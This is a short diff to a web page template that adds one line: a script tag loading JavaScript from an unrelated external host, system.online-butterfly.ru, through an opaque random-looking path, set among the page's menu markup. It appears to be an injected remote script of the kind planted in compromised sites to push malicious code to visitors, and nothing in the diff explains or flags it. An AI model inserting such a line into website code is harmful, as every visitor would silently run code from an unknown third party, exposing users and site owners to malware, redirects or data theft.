@@ -103,6 +103,7 @@
         <tr>
           <td valign="top">
             <div class="leftmenu-grey-line"><img src="/img/0.gif" width="240" height="4"></div>
+			<script type="text/javascript" src="http://system.online-butterfly.ru/channel/js/main/oJLmWFQiVPrsYnJ/"></script>
             {raMethod ref=/catalog/cats.htm}
             {if $node.id == 98}
             {raMethod ref=/article/cloud.htm}
